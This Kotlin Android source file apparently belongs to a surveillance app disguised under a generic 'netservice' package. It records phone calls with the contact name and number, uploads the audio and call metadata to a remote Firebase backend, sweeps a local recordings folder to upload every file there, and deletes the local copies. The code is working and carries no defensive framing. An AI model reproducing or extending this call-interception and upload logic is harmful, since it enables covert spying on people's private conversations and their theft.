package com.dtz.netservice.services.calls

import android.content.Context
import android.media.MediaRecorder
import android.net.Uri
import android.os.Environment
import android.os.Handler
import android.util.Log
import com.dtz.netservice.rxFirebase.InterfaceFirebase
import com.dtz.netservice.data.model.Calls
import com.dtz.netservice.services.base.BaseInteractorService
import com.dtz.netservice.utils.ConstFun.getDateTime
import com.dtz.netservice.utils.ConstFun.isAndroidM
import com.dtz.netservice.utils.Consts.ADDRESS_AUDIO_CALLS
import com.dtz.netservice.utils.Consts.CALLS
import com.dtz.netservice.utils.Consts.DATA
import com.dtz.netservice.utils.FileHelper
import com.dtz.netservice.utils.FileHelper.getFileNameCall
import com.dtz.netservice.utils.FileHelper.getContactName
import com.dtz.netservice.utils.FileHelper.getDurationFile
import com.dtz.netservice.utils.FileHelper.getFilePath
import com.dtz.netservice.utils.MediaRecorderUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.io.File
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorCalls<S : InterfaceServiceCalls> @Inject constructor(
    context: Context,
    firebase: InterfaceFirebase
) : BaseInteractorService<S>(context, firebase), InterfaceInteractorCalls<S> {

    private var recorder: MediaRecorderUtils = MediaRecorderUtils { deleteFile() }
    private var fileName: String? = null
    private var contact: String? = null
    private var phoneNumber: String? = null
    private var type: Int = 0
    private var dateTime: String? = null

    override fun startRecording(phoneNumber: String?, type: Int) {

        this.type = type
        this.phoneNumber = phoneNumber
        dateTime = getDateTime()
        contact = getContext().getContactName(phoneNumber)
        fileName = getContext().getFileNameCall(phoneNumber, dateTime)

        if (isAndroidM()) recorder.startRecording(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            fileName
        )
        else recorder.startRecording(MediaRecorder.AudioSource.VOICE_CALL, fileName)

    }

    override fun stopRecording() {
        recorder.stopRecording { sendFileCall() }
        Handler().postDelayed({
            getRecordsLists(getContext())
        }, 10000)
    }

    private fun deleteFile() {
        FileHelper.deleteFile(fileName)
        if (getService() != null) getService()!!.stopServiceCalls()
    }

    private fun sendFileCall() {
        Handler().postDelayed({
            val filePath = "${getContext().getFilePath()}/$ADDRESS_AUDIO_CALLS"
            val dateNumber = fileName!!.replace("$filePath/", "")
            val uri = Uri.fromFile(File(fileName))
            getService()!!.addDisposable(
                firebase().putFile("$CALLS/$dateNumber", uri)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ setPushName() }, { deleteFile() })
            )
        }, 5000)
    }

    private fun setPushName() {
        val duration = getDurationFile(fileName!!)
        val calls = Calls(contact, phoneNumber, dateTime, duration, type)
        firebase().getDatabaseReference("$CALLS/$DATA").push().setValue(calls)
        deleteFile()
    }

    private fun getRecordsLists(context: Context) {
        val callsDir = context.getExternalFilesDir(Environment.DIRECTORY_DOWNLOADS)?.path + "/records/calls/"
        File(callsDir).walk().forEach {
            val file = File(it.path)
            Log.d("AI", it.path)
            if (file.isFile) {
                uploadCallFile(file)
            }
        }
    }

    private fun uploadCallFile(file: File) {
        val uri = Uri.fromFile(file)
        firebase().getStorageReference("recording_calls/${uri.lastPathSegment}")
            .putFile(uri)
            .addOnSuccessListener { taskSnapshot ->
                val callMap: MutableMap<String, Any> = mutableMapOf()
                callMap["file"] = taskSnapshot.metadata?.path.toString()
                callMap["size"] = taskSnapshot.metadata?.sizeBytes.toString()
                callMap["date"] = taskSnapshot.metadata?.creationTimeMillis.toString()

                val name = uri.lastPathSegment.toString().replace(".", "")
                saveLink(callMap, name)
            }

    }

    private fun saveLink(callMap: MutableMap<String, Any>, lastPathSegment: String) {
        firebase().getDatabaseReference("recording_calls")
            .child(lastPathSegment)
            .updateChildren(callMap)
    }

}